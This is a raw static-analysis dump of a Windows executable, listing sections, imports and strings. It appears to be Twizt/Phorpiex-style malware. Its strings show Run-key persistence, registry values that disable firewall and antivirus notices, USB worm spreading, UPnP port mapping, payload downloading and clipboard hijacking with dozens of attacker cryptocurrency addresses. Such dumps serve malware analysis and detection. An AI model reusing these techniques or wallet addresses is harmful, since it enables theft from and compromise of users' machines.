Missing bin header main
Missing bin header dwarf
[Sections]

nth paddr         size vaddr        vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000400  0xde00 0x00401000  0xe000 -r-x .text
1   0x0000e200  0x2e00 0x0040f000  0x3000 -r-- .rdata
2   0x00011000   0xa00 0x00412000  0x2000 -rw- .data

[Segments]

nth paddr  size vaddr  vsize perm name
――――――――――――――――――――――――――――――――――――――

[Entrypoints]
vaddr=0x004059a0 paddr=0x00004da0 haddr=0x00000110 type=program

1 entrypoints
[Constructors]

0 entrypoints
[Imports]
nth vaddr      bind type lib          name
14  0x0000e3b8 0x0040f1b8 NONE FUNC 0    USER32.dll   imp.wsprintfA
15  0x0000e3bc 0x0040f1bc NONE FUNC 0    USER32.dll   imp.wvsprintfA
16  0x0000e3c0 0x0040f1c0 NONE FUNC 0    USER32.dll   imp.GetWindowLongW
17  0x0000e3c4 0x0040f1c4 NONE FUNC 0    USER32.dll   imp.CreateWindowExW
18  0x0000e3c8 0x0040f1c8 NONE FUNC 0    USER32.dll   imp.DispatchMessageA
19  0x0000e3cc 0x0040f1cc NONE FUNC 0    USER32.dll   imp.OpenClipboard
20  0x0000e3d0 0x0040f1d0 NONE FUNC 0    USER32.dll   imp.SetClipboardData
21  0x0000e3d4 0x0040f1d4 NONE FUNC 0    USER32.dll   imp.SetClipboardViewer
1   0x0000e200 0x0040f000 NONE FUNC 0    ADVAPI32.dll imp.RegSetValueExW
2   0x0000e204 0x0040f004 NONE FUNC 0    ADVAPI32.dll imp.CryptGenRandom
3   0x0000e208 0x0040f008 NONE FUNC 0    ADVAPI32.dll imp.CryptReleaseContext
4   0x0000e20c 0x0040f00c NONE FUNC 0    ADVAPI32.dll imp.CryptAcquireContextW
5   0x0000e210 0x0040f010 NONE FUNC 0    ADVAPI32.dll imp.RegQueryValueExW
6   0x0000e214 0x0040f014 NONE FUNC 0    ADVAPI32.dll imp.RegOpenKeyExA
7   0x0000e218 0x0040f018 NONE FUNC 0    ADVAPI32.dll imp.RegSetValueExA
8   0x0000e21c 0x0040f01c NONE FUNC 0    ADVAPI32.dll imp.RegCloseKey
9   0x0000e220 0x0040f020 NONE FUNC 0    ADVAPI32.dll imp.RegOpenKeyExW
1   0x0000e358 0x0040f158 NONE FUNC 0    SHELL32.dll  imp.ShellExecuteW
1   0x0000e4dc 0x0040f2dc NONE FUNC 0    ole32.dll    imp.CoInitializeEx
2   0x0000e4e0 0x0040f2e0 NONE FUNC 0    ole32.dll    imp.CoCreateInstance
3   0x0000e4e4 0x0040f2e4 NONE FUNC 0    ole32.dll    imp.CoInitialize
4   0x0000e4e8 0x0040f2e8 NONE FUNC 0    ole32.dll    imp.CoUninitialize
2   0x0000e34c 0x0040f14c NONE FUNC 0    OLEAUT32.dll imp.SysReAllocString
6   0x0000e350 0x0040f150 NONE FUNC 0    OLEAUT32.dll imp.SysStringLen
[Strings]
nth paddr      vaddr      len size section type    string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x0000e4fa 0x0040f2fa 4   5    .rdata  ascii   3)6{
1   0x0000e547 0x0040f347 4   5    .rdata  ascii   FUKR
2   0x0000e54c 0x0040f34c 4   10   .rdata  utf16le open
3   0x0000e558 0x0040f358 114 115  .rdata  ascii   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
4   0x0000e5cc 0x0040f3cc 6   14   .rdata  utf16le %temp%
5   0x0000e5dc 0x0040f3dc 11  24   .rdata  utf16le %s\%d%d.exe
6   0x0000e5f6 0x0040f3f6 115 232  .rdata  utf16le TMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
7   0x0000e6e0 0x0040f4e0 18  38   .rdata  utf16le %s:Zone.Identifier
8   0x0000e708 0x0040f508 11  24   .rdata  utf16le %s\%d%d.exe
9   0x0000e720 0x0040f520 18  38   .rdata  utf16le %s:Zone.Identifier
10  0x0000e748 0x0040f548 15  16   .rdata  ascii   HTTP/1.1 200 OK
11  0x0000e758 0x0040f558 10  11   .rdata  ascii   LOCATION: 
12  0x0000e764 0x0040f564 15  16   .rdata  ascii   239.255.255.250
13  0x0000e774 0x0040f574 4   10   .rdata  utf16le Body
14  0x0000e780 0x0040f580 135 136  .rdata  ascii   M-SEARCH * HTTP/1.1\r\nST:urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\nMX: 3\r\nMan:"ssdp:discover"\r\nHOST: 239.255.255.250:1900\r\n\r\n
15  0x0000e808 0x0040f608 7   16   .rdata  utf16le service
16  0x0000e818 0x0040f618 11  24   .rdata  utf16le serviceType
17  0x0000e830 0x0040f630 11  24   .rdata  utf16le serviceList
18  0x0000e848 0x0040f648 6   14   .rdata  utf16le device
19  0x0000e858 0x0040f658 10  22   .rdata  utf16le deviceType
20  0x0000e870 0x0040f670 10  22   .rdata  utf16le deviceList
21  0x0000e888 0x0040f688 51  104  .rdata  utf16le urn:schemas-upnp-org:device:InternetGatewayDevice:1
22  0x0000e8f0 0x0040f6f0 39  80   .rdata  utf16le urn:schemas-upnp-org:device:WANDevice:1
23  0x0000e940 0x0040f740 49  100  .rdata  utf16le urn:schemas-upnp-org:device:WANConnectionDevice:1
24  0x0000e9a4 0x0040f7a4 28  58   .rdata  utf16le GetExternalIPAddressResponse
25  0x0000e9e0 0x0040f7e0 46  94   .rdata  utf16le urn:schemas-upnp-org:service:WANIPConnection:1
26  0x0000ea40 0x0040f840 47  96   .rdata  utf16le urn:schemas-upnp-org:service:WANPPPConnection:1
27  0x0000eaa0 0x0040f8a0 10  22   .rdata  utf16le controlURL
28  0x0000eab8 0x0040f8b8 7   16   .rdata  utf16le URLBase
29  0x0000eac8 0x0040f8c8 4   5    .rdata  ascii   %S%S
30  0x0000ead0 0x0040f8d0 46  47   .rdata  ascii   Mozilla/4.0 (compatible; UPnP/1.0; Windows 9x)
31  0x0000eb00 0x0040f900 4   5    .rdata  ascii   POST
32  0x0000eb08 0x0040f908 103 104  .rdata  ascii   Content-Type: text/xml; charset="utf-8"\r\nConnection: Close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n
33  0x0000eb70 0x0040f970 303 304  .rdata  ascii   <?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><m:GetExternalIPAddress xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"/></SOAP-ENV:Body></SOAP-ENV:Envelope>\r\n\r\n
34  0x0000eca0 0x0040faa0 81  82   .rdata  ascii   SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress"
35  0x0000ecf4 0x0040faf4 20  42   .rdata  utf16le NewExternalIPAddress
36  0x0000ed20 0x0040fb20 641 642  .rdata  ascii   <?xml version="1.0"?>\r\n<SOAP-ENV:Envelope\r\n xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"\r\n SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n<SOAP-ENV:Body>\r\n<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">\r\n<NewRemoteHost></NewRemoteHost>\r\n<NewExternalPort>%d</NewExternalPort>\r\n<NewProtocol>%s</NewProtocol>\r\n<NewInternalPort>%d</NewInternalPort>\r\n<NewInternalClient>%s</NewInternalClient>\r\n<NewEnabled>1</NewEnabled>\r\n<NewPortMappingDescription></NewPortMappingDescription>\r\n<NewLeaseDuration>0</NewLeaseDuration>\r\n</m:AddPortMapping>\r\n</SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>\r\n\r\n
37  0x0000efa8 0x0040fda8 75  76   .rdata  ascii   SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
38  0x0000eff8 0x0040fdf8 442 443  .rdata  ascii   <?xml version="1.0"?>\r\n<SOAP-ENV:Envelope\r\n xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"\r\n SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n<SOAP-ENV:Body>\r\n<m:DeletePortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">\r\n<NewRemoteHost>%s</NewRemoteHost>\r\n<NewExternalPort>%d</NewExternalPort>\r\n<NewProtocol>%s</NewProtocol>\r\n</m:DeletePortMapping>\r\n</SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>\r\n\r\n
39  0x0000f1b8 0x0040ffb8 78  79   .rdata  ascii   SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping"
40  0x0000f214 0x00410014 37  38   .rdata  ascii   TCP: P2P_SendGETLPacket(0,%s) failed!
41  0x0000f23c 0x0041003c 5   6    .rdata  ascii   Twizt
42  0x0000f244 0x00410044 5   6    .rdata  ascii   Twizt
43  0x0000f24c 0x0041004c 5   6    .rdata  ascii   Twizt
44  0x0000f254 0x00410054 5   6    .rdata  ascii   Twizt
45  0x0000f25c 0x0041005c 24  25   .rdata  ascii   www.update.microsoft.com
46  0x0000f281 0x00410081 8   11   .rdata  utf8    Ȫ4d(2dwh blocks=Latin Extended-B,Basic Latin
47  0x0000f2b7 0x004100b7 5   6    .rdata  ascii   T1`m\n
48  0x0000f2bf 0x004100bf 4   5    .rdata  ascii   J\r."
49  0x0000f2eb 0x004100eb 5   6    .rdata  ascii   c"5o\r
50  0x0000f300 0x00410100 6   28   .rdata  utf32le 123456
51  0x0000f320 0x00410120 18  38   .rdata  utf16le %s:Zone.Identifier
52  0x0000f348 0x00410148 13  28   .rdata  utf16le %userprofile%
53  0x0000f364 0x00410164 8   18   .rdata  utf16le %windir%
54  0x0000f378 0x00410178 5   12   .rdata  utf16le %s\%s
55  0x0000f384 0x00410184 5   12   .rdata  utf16le %s\%s
56  0x0000f390 0x00410190 46  94   .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\Run\
57  0x0000f3f0 0x004101f0 46  94   .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\Run\
58  0x0000f450 0x00410250 34  35   .rdata  ascii   SOFTWARE\Microsoft\Security Center
59  0x0000f474 0x00410274 16  17   .rdata  ascii   FirewallOverride
60  0x0000f488 0x00410288 21  22   .rdata  ascii   FirewallDisableNotify
61  0x0000f4a0 0x004102a0 19  20   .rdata  ascii   AntiSpywareOverride
62  0x0000f4b4 0x004102b4 17  18   .rdata  ascii   AntiVirusOverride
63  0x0000f4c8 0x004102c8 22  23   .rdata  ascii   AntiVirusDisableNotify
64  0x0000f4e0 0x004102e0 15  16   .rdata  ascii   UpdatesOverride
65  0x0000f4f0 0x004102f0 20  21   .rdata  ascii   UpdatesDisableNotify
66  0x0000f508 0x00410308 38  39   .rdata  ascii   SOFTWARE\Microsoft\Security Center\Svc
67  0x0000f530 0x00410330 16  17   .rdata  ascii   FirewallOverride
68  0x0000f544 0x00410344 21  22   .rdata  ascii   FirewallDisableNotify
69  0x0000f55c 0x0041035c 19  20   .rdata  ascii   AntiSpywareOverride
70  0x0000f570 0x00410370 17  18   .rdata  ascii   AntiVirusOverride
71  0x0000f584 0x00410384 22  23   .rdata  ascii   AntiVirusDisableNotify
72  0x0000f59c 0x0041039c 15  16   .rdata  ascii   UpdatesOverride
73  0x0000f5ac 0x004103ac 20  21   .rdata  ascii   UpdatesDisableNotify
74  0x0000f5c4 0x004103c4 13  28   .rdata  utf16le %s\tnodes.dat
75  0x0000f5e0 0x004103e0 12  26   .rdata  utf16le %s\tcmds.dat
76  0x0000f5fc 0x004103fc 21  44   .rdata  utf16le Microsoft Corporation
77  0x0000f628 0x00410428 4   10   .rdata  utf16le \??\
78  0x0000f638 0x00410438 59  120  .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
79  0x0000f6b0 0x004104b0 8   18   .rdata  utf16le NoDrives
80  0x0000f6c8 0x004104c8 40  82   .rdata  utf16le /c start .\%s & start .\%s\VolDriver.exe
81  0x0000f71c 0x0041051c 25  52   .rdata  utf16le %windir%\system32\cmd.exe
82  0x0000f750 0x00410550 4   10   .rdata  utf16le %s\*
83  0x0000f768 0x00410568 5   12   .rdata  utf16le %s\%s
84  0x0000f774 0x00410574 5   12   .rdata  utf16le %s\%s
85  0x0000f780 0x00410580 6   14   .rdata  utf16le %s.lnk
86  0x0000f790 0x00410590 5   12   .rdata  utf16le %s\%s
87  0x0000f79c 0x0041059c 19  40   .rdata  utf16le %s\%s\VolDriver.exe
88  0x0000f7c4 0x004105c4 5   12   .rdata  utf16le %s\%s
89  0x0000f7d0 0x004105d0 4   10   .rdata  utf16le %s\*
90  0x0000f7dc 0x004105dc 11  24   .rdata  utf16le shell32.dll
91  0x0000f7f4 0x004105f4 11  24   .rdata  utf16le shell32.dll
92  0x0000f80c 0x0041060c 5   12   .rdata  utf16le *.lnk
93  0x0000f818 0x00410618 5   12   .rdata  utf16le *.vbs
94  0x0000f824 0x00410624 4   10   .rdata  utf16le *.js
95  0x0000f830 0x00410630 5   12   .rdata  utf16le *.inf
96  0x0000f83c 0x0041063c 5   12   .rdata  utf16le *.scr
97  0x0000f848 0x00410648 5   12   .rdata  utf16le *.com
98  0x0000f854 0x00410654 5   12   .rdata  utf16le *.jse
99  0x0000f860 0x00410660 5   12   .rdata  utf16le *.cmd
100 0x0000f86c 0x0041066c 5   12   .rdata  utf16le *.pif
101 0x0000f878 0x00410678 5   12   .rdata  utf16le *.jar
102 0x0000f884 0x00410684 5   12   .rdata  utf16le *.dll
103 0x0000f890 0x00410690 5   12   .rdata  utf16le *.vbe
104 0x0000f89c 0x0041069c 5   12   .rdata  utf16le *.bat
105 0x0000f8a8 0x004106a8 9   20   .rdata  utf16le Thumbs.db
106 0x0000f8bc 0x004106bc 12  26   .rdata  utf16le $RECYCLE.BIN
107 0x0000f8d8 0x004106d8 11  24   .rdata  utf16le desktop.ini
108 0x0000f8f0 0x004106f0 25  52   .rdata  utf16le System Volume Information
109 0x0000f930 0x00410730 5   12   .rdata  utf16le %s\%s
110 0x0000f93c 0x0041073c 5   12   .rdata  utf16le %s\%s
111 0x0000f948 0x00410748 8   18   .rdata  utf16le %s\%s\%s
112 0x0000f95c 0x0041075c 7   16   .rdata  utf16le  (%dGB)
113 0x0000f96c 0x0041076c 14  30   .rdata  utf16le Unnamed volume
114 0x0000f98c 0x0041078c 4   10   .rdata  utf16le %s%s
115 0x0000f998 0x00410798 12  26   .rdata  utf16le bitcoincash:
116 0x0000f9b4 0x004107b4 6   14   .rdata  utf16le cosmos
117 0x0000f9c4 0x004107c4 4   10   .rdata  utf16le addr
118 0x0000f9d0 0x004107d0 12  26   .rdata  utf16le bitcoincash:
119 0x0000f9ec 0x004107ec 20  21   .rdata  ascii   8805387670930220807L
120 0x0000fa04 0x00410804 48  49   .rdata  ascii   12VbyF3uuSieog3ZJUY8wdrHQMGMvsCrCeMADCQnQrbo286n
121 0x0000fa38 0x00410838 34  35   .rdata  ascii   1ENpPzJaBwMweWp6MpVFVtuPN2DzSxTveN
122 0x0000fa5c 0x0041085c 35  36   .rdata  ascii   3P5aHxJT3v3TVTuraCeYLszdQW6kKirfZjf
123 0x0000fa80 0x00410880 34  35   .rdata  ascii   39YED6ipUYq6ZT9KMN1KxaSQ2e6bRu6qF1
124 0x0000faa4 0x004108a4 42  43   .rdata  ascii   qqwf6x8d3qpalv065n7hr7n9smu4rtkays5dqwqxmq
125 0x0000fad0 0x004108d0 34  35   .rdata  ascii   XsmGfL72GT8s6mhk46MHwYkT8L2EjmfxE9
126 0x0000faf4 0x004108f4 34  35   .rdata  ascii   DGPBhU49o7uvQNYuFmxvBGvHADJXchGUmR
127 0x0000fb18 0x00410918 42  43   .rdata  ascii   0x78308642A7e1560fF7De7118a494CC0Bb9f68450
128 0x0000fb44 0x00410944 34  35   .rdata  ascii   LXZR7UjNBVrBU7uY9KTKN4a3VuLDErTixC
129 0x0000fb68 0x00410968 34  35   .rdata  ascii   rpVfksB43Qqwb7QTg9qTvKcenGLWib2eFA
130 0x0000fb8c 0x0041098c 34  35   .rdata  ascii   TXFe5bHLXn4H5oy8e1aU5ecM8X7SmmPEJ9
131 0x0000fbb0 0x004109b0 35  36   .rdata  ascii   t1aJS24Qg1XjRgvW1FcjhsvBpQUhtP6aEsL
132 0x0000fbd4 0x004109d4 36  37   .rdata  ascii   tz1Sj3fKTkShUPi8mSFEYfJ3WTFMrScVzEfY
133 0x0000fbfc 0x004109fc 42  43   .rdata  ascii   hx57e75fffa635f53f4d329cb16a86ada67e57d719
134 0x0000fc28 0x00410a28 34  35   .rdata  ascii   QZVZLvVg7ubCqjid8thfYU3oXS7UeDGNW1
135 0x0000fc4c 0x00410a4c 34  35   .rdata  ascii   RVPsfTJZCW2m3Yf1XfgYhK6QPL7adEcYnq
136 0x0000fc70 0x00410a70 40  41   .rdata  ascii   NDE6CCHLRDSBBR2YOHBWBDYRS2SLZ3LLWEYWRAZU
137 0x0000fc9c 0x00410a9c 34  35   .rdata  ascii   AWkkuMdjU6DBFCUY2EGjPuB36uLm5qaQgt
138 0x0000fcc0 0x00410ac0 34  35   .rdata  ascii   SWaLj5pSm4rae4Nf5DBf5sRjjxyHApoV7V
139 0x0000fce4 0x00410ae4 42  43   .rdata  ascii   zil1szqapnl36m5du69gap2ry85e4xwfzxv2klrwzj
140 0x0000fd10 0x00410b10 35  36   .rdata  ascii   s1fQBLAXB3xWRax4h6bgWBcgSjSdYrNW27F
141 0x0000fd34 0x00410b34 11  24   .rdata  utf16le bitcoincash
142 0x0000fd4c 0x00410b4c 54  55   .rdata  ascii   bitcoincash:qqwf6x8d3qpalv065n7hr7n9smu4rtkays5dqwqxmq
143 0x0000fd84 0x00410b84 6   14   .rdata  utf16le cosmos
144 0x0000fd94 0x00410b94 45  46   .rdata  ascii   cosmos19h9yct0z0yxtj6uvm30ywcj6gk0sjvv8yh7rnq
145 0x0000fdc8 0x00410bc8 95  96   .rdata  ascii   4AtjkCVKbtEC3UEN77SQHuH9i1XkzNiRi5VCbA2XGsJh46nJSXfGQn4GjLuupCqmC57Lo7LvKmFUyRfhtJSvKvuw3h9ReKK
146 0x0000fe28 0x00410c28 4   10   .rdata  utf16le addr
147 0x0000fe38 0x00410c38 103 104  .rdata  ascii   addr1qy642ghmk2qjsrdkjht06fus40zt7f8ggwxpjzttp8955emjwgx5dzz4lu7rmu468ca0qed5xzlrll0lz79y53m9ck0svkq4sy
148 0x0000fea0 0x00410ca0 34  35   .rdata  ascii   FiYXqu2wkS3V67qDEvUixQhi2BVx1dWW9L
149 0x0000fec4 0x00410cc4 56  57   .rdata  ascii   GDAXYQXYKX7VHW2AB7FXDHQIWGX7B6IOIHE4PPJV54IUGC3WJ5YANL7X
150 0x0000ff00 0x00410d00 34  35   .rdata  ascii   GWwiE6F4KCvzbQusNtEGJY4b4pcFbSzU2C
151 0x0000ff2c 0x00410d2c 42  43   .rdata  ascii   bnb1g33vy2ej4tkhjfatz63zhtktc7r2gr55ghdafu
152 0x0000ff58 0x00410d58 4   10   .rdata  utf16le band
153 0x0000ff64 0x00410d64 43  44   .rdata  ascii   band1rscgrnzmdn2j7xfce9psswgwx8d3y3w0dzfupf
154 0x0000ff98 0x00410d98 42  43   .rdata  ascii   bc1qcuyut45txxcd7xfl44n5wxdehyxna0xxjnh96d
155 0x0000ffc4 0x00410dc4 9   10   .rdata  ascii   U30212907
156 0x0000ffd0 0x00410dd0 9   10   .rdata  ascii   E30940134
157 0x0000ffdc 0x00410ddc 9   10   .rdata  ascii   B30912949
158 0x0000ffe8 0x00410de8 4   10   .rdata  utf16le %x%X
159 0x0000fff6 0x00410df6 4   5    .rdata  ascii   L09n
160 0x00010018 0x00410e18 4   5    .rdata  ascii   b'kJ
161 0x00010480 0x00411280 10  11   .rdata  ascii   WS2_32.dll
162 0x0001048e 0x0041128e 7   8    .rdata  ascii   StrStrW
163 0x00010498 0x00411298 15  16   .rdata  ascii   PathFileExistsW
164 0x000104aa 0x004112aa 8   9    .rdata  ascii   StrCmpNW
165 0x000104b6 0x004112b6 14  15   .rdata  ascii   PathMatchSpecW
166 0x000104c8 0x004112c8 17  18   .rdata  ascii   PathFindFileNameW
167 0x000104dc 0x004112dc 7   8    .rdata  ascii   StrChrA
168 0x000104e6 0x004112e6 8   9    .rdata  ascii   StrStrIA
169 0x000104f2 0x004112f2 9   10   .rdata  ascii   StrCmpNIA
170 0x000104fc 0x004112fc 11  12   .rdata  ascii   SHLWAPI.dll
171 0x0001050a 0x0041130a 18  19   .rdata  ascii   URLDownloadToFileW
172 0x0001051e 0x0041131e 10  11   .rdata  ascii   urlmon.dll
173 0x0001052c 0x0041132c 16  17   .rdata  ascii   InternetConnectA
174 0x00010540 0x00411340 17  18   .rdata  ascii   InternetCrackUrlA
175 0x00010554 0x00411354 16  17   .rdata  ascii   InternetReadFile
176 0x00010568 0x00411368 16  17   .rdata  ascii   HttpOpenRequestA
177 0x0001057c 0x0041137c 22  23   .rdata  ascii   HttpAddRequestHeadersA
178 0x00010596 0x00411396 16  17   .rdata  ascii   HttpSendRequestA
179 0x000105aa 0x004113aa 13  14   .rdata  ascii   InternetOpenA
180 0x000105ba 0x004113ba 19  20   .rdata  ascii   InternetCloseHandle
181 0x000105d0 0x004113d0 13  14   .rdata  ascii   InternetOpenW
182 0x000105e0 0x004113e0 14  15   .rdata  ascii   HttpQueryInfoA
183 0x000105f2 0x004113f2 16  17   .rdata  ascii   InternetOpenUrlA
184 0x00010606 0x00411406 16  17   .rdata  ascii   InternetOpenUrlW
185 0x00010618 0x00411418 11  12   .rdata  ascii   WININET.dll
186 0x00010626 0x00411426 7   8    .rdata  ascii   isalpha
187 0x00010630 0x00411430 7   8    .rdata  ascii   isdigit
188 0x0001063a 0x0041143a 7   8    .rdata  ascii   memmove
189 0x00010644 0x00411444 17  18   .rdata  ascii   NtQuerySystemTime
190 0x00010658 0x00411458 25  26   .rdata  ascii   RtlTimeToSecondsSince1980
191 0x00010674 0x00411474 8   9    .rdata  ascii   mbstowcs
192 0x0001067e 0x0041147e 9   10   .rdata  ascii   ntdll.dll
193 0x0001068a 0x0041148a 10  11   .rdata  ascii   _vscprintf
194 0x00010698 0x00411498 4   5    .rdata  ascii   rand
195 0x000106a0 0x004114a0 5   6    .rdata  ascii   srand
196 0x000106a6 0x004114a6 10  11   .rdata  ascii   msvcrt.dll
197 0x000106b4 0x004114b4 8   9    .rdata  ascii   lstrlenA
198 0x000106c0 0x004114c0 10  11   .rdata  ascii   GlobalLock
199 0x000106ce 0x004114ce 16  17   .rdata  ascii   GetModuleHandleW
200 0x000106e2 0x004114e2 12  13   .rdata  ascii   GetTickCount
201 0x000106f2 0x004114f2 11  12   .rdata  ascii   GlobalAlloc
202 0x00010700 0x00411500 5   6    .rdata  ascii   Sleep
203 0x00010708 0x00411508 9   10   .rdata  ascii   lstrcpynW
204 0x00010714 0x00411514 10  11   .rdata  ascii   ExitThread
205 0x00010722 0x00411522 19  20   .rdata  ascii   MultiByteToWideChar
206 0x00010738 0x00411538 8   9    .rdata  ascii   lstrlenW
207 0x00010744 0x00411544 12  13   .rdata  ascii   GlobalUnlock
208 0x00010754 0x00411554 11  12   .rdata  ascii   GetFileSize
209 0x00010762 0x00411562 13  14   .rdata  ascii   MapViewOfFile
210 0x00010772 0x00411572 15  16   .rdata  ascii   UnmapViewOfFile
211 0x00010784 0x00411584 9   10   .rdata  ascii   WriteFile
212 0x00010790 0x00411590 25  26   .rdata  ascii   InitializeCriticalSection
213 0x000107ac 0x004115ac 20  21   .rdata  ascii   LeaveCriticalSection
214 0x000107c4 0x004115c4 11  12   .rdata  ascii   CreateFileW
215 0x000107d2 0x004115d2 16  17   .rdata  ascii   FlushFileBuffers
216 0x000107e6 0x004115e6 20  21   .rdata  ascii   EnterCriticalSection
217 0x000107fe 0x004115fe 18  19   .rdata  ascii   CreateFileMappingW
218 0x00010814 0x00411614 11  12   .rdata  ascii   CloseHandle
219 0x00010822 0x00411622 14  15   .rdata  ascii   FindFirstFileW
220 0x00010834 0x00411634 13  14   .rdata  ascii   GetDriveTypeW
221 0x00010844 0x00411644 11  12   .rdata  ascii   MoveFileExW
222 0x00010852 0x00411652 16  17   .rdata  ascii   CreateDirectoryW
223 0x00010866 0x00411666 16  17   .rdata  ascii   GetLogicalDrives
224 0x0001087a 0x0041167a 9   10   .rdata  ascii   CopyFileW
225 0x00010886 0x00411686 18  19   .rdata  ascii   GetModuleFileNameW
226 0x0001089c 0x0041169c 8   9    .rdata  ascii   lstrcmpW
227 0x000108a8 0x004116a8 9   10   .rdata  ascii   FindClose
228 0x000108b4 0x004116b4 16  17   .rdata  ascii   RemoveDirectoryW
229 0x000108c8 0x004116c8 15  16   .rdata  ascii   QueryDosDeviceW
230 0x000108da 0x004116da 9   10   .rdata  ascii   lstrcmpiW
231 0x000108e6 0x004116e6 13  14   .rdata  ascii   FindNextFileW
232 0x000108f6 0x004116f6 19  20   .rdata  ascii   GetDiskFreeSpaceExW
233 0x0001090c 0x0041170c 11  12   .rdata  ascii   DeleteFileW
234 0x0001091a 0x0041171a 8   9    .rdata  ascii   lstrcpyW
235 0x00010926 0x00411726 18  19   .rdata  ascii   SetFileAttributesW
236 0x0001093c 0x0041173c 21  22   .rdata  ascii   GetVolumeInformationW
237 0x00010954 0x00411754 11  12   .rdata  ascii   ExitProcess
238 0x00010962 0x00411762 12  13   .rdata  ascii   CreateEventA
239 0x00010972 0x00411772 12  13   .rdata  ascii   GetLastError
240 0x00010982 0x00411782 12  13   .rdata  ascii   CreateMutexA
241 0x00010992 0x00411792 12  13   .rdata  ascii   CreateThread
242 0x000109a2 0x004117a2 25  26   .rdata  ascii   ExpandEnvironmentStringsW
243 0x000109be 0x004117be 11  12   .rdata  ascii   HeapReAlloc
244 0x000109cc 0x004117cc 9   10   .rdata  ascii   HeapAlloc
245 0x000109d8 0x004117d8 8   9    .rdata  ascii   HeapFree
246 0x000109e4 0x004117e4 10  11   .rdata  ascii   HeapCreate
247 0x000109f2 0x004117f2 12  13   .rdata  ascii   HeapValidate
248 0x00010a02 0x00411802 15  16   .rdata  ascii   GetProcessHeaps
249 0x00010a14 0x00411814 18  19   .rdata  ascii   HeapSetInformation
250 0x00010a2a 0x0041182a 19  20   .rdata  ascii   GetCurrentProcessId
251 0x00010a40 0x00411840 20  21   .rdata  ascii   InterlockedDecrement
252 0x00010a58 0x00411858 19  20   .rdata  ascii   WaitForSingleObject
253 0x00010a6e 0x0041186e 19  20   .rdata  ascii   InterlockedExchange
254 0x00010a84 0x00411884 20  21   .rdata  ascii   InterlockedIncrement
255 0x00010a9c 0x0041189c 22  23   .rdata  ascii   InterlockedExchangeAdd
256 0x00010ab6 0x004118b6 17  18   .rdata  ascii   GetCurrentProcess
257 0x00010aca 0x004118ca 16  17   .rdata  ascii   GetCurrentThread
258 0x00010ade 0x004118de 17  18   .rdata  ascii   SetThreadPriority
259 0x00010af2 0x004118f2 17  18   .rdata  ascii   GetThreadPriority
260 0x00010b06 0x00411906 21  22   .rdata  ascii   DeleteCriticalSection
261 0x00010b1e 0x0041191e 15  16   .rdata  ascii   DuplicateHandle
262 0x00010b30 0x00411930 14  15   .rdata  ascii   GetLocaleInfoA
263 0x00010b42 0x00411942 14  15   .rdata  ascii   CreateProcessW
264 0x00010b52 0x00411952 12  13   .rdata  ascii   KERNEL32.dll
265 0x00010b62 0x00411962 18  19   .rdata  ascii   SetClipboardViewer
266 0x00010b78 0x00411978 16  17   .rdata  ascii   SetClipboardData
